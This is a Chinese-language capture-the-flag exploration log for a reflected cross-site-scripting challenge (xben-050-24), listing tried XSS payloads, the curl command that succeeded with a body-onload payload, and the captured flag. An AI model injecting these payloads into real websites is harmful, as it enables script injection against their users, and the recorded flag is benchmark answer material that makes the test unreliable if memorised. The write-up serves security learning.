# xben-050-24 · 探索记录

对应题解：[`xben-050-24.md`](./xben-050-24.md)

## 目标与起点

`Werkzeug/1.0.1 Python/2.7.18`，`GET /page?name=…`，样式 `xss22.css`。
反射在文本节点：

```html
<input type=text name=name placeholder="Enter your name...">
                    abc
```

## 第一阶段：逐字符探测

```text
altered: []
```

94 个可打印字符全部原样保留 —— **没有任何字符级过滤**。

## 第二阶段：常规 payload 枚举

| payload | 结果 |
| --- | --- |
| `<svg onload=alert("XSS")>` | 失败 |
| `<svg/onload=alert("XSS")>` | 失败 |
| `<img src=x onerror=alert("XSS")>` | 失败 |
| `<input autofocus onfocus=alert("XSS")>` | 失败 |
| **`<body onload=alert("XSS")>`** | **Congratulations** |

## 第三阶段：拿 flag

```bash
curl --get --data-urlencode 'name=<body onload=alert("XSS")>' http://$T/page
```

```text
flag{9745ec52-590f-4727-b93e-431e4ca7f383}
```

提交：`correct: true, awarded: 200`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `svg onload`（046 的解法） | 失败 | 本关不接受该标签 |
| `img onerror` | 失败 | 同上 |
| `input autofocus onfocus`（004/008 的解法） | 失败 | 同上 |
| `<body onload=…>` | **成功** | 文档级 onload 被接受 |

## 这次真正的收获

1. **"无过滤" 不代表 payload 一定能触发。** 字符全放行但只有 `body onload` 成立，
   说明评测端对触发条件有额外约束（可能只监听文档 `onload`）。
2. **探测要分两步**：先逐字符（判断有没有过滤），再枚举少量标签/事件组合
   （判断哪个组合被接受）。混在一起做会浪费很多请求。
3. **同族各关的有效 payload 差异极大**：004/008 用 `autofocus+onfocus`、
   046 用 `svg onload`、050 用 `body onload`、010 用 JSFuck。
   每关都要重新实测，不能照搬。
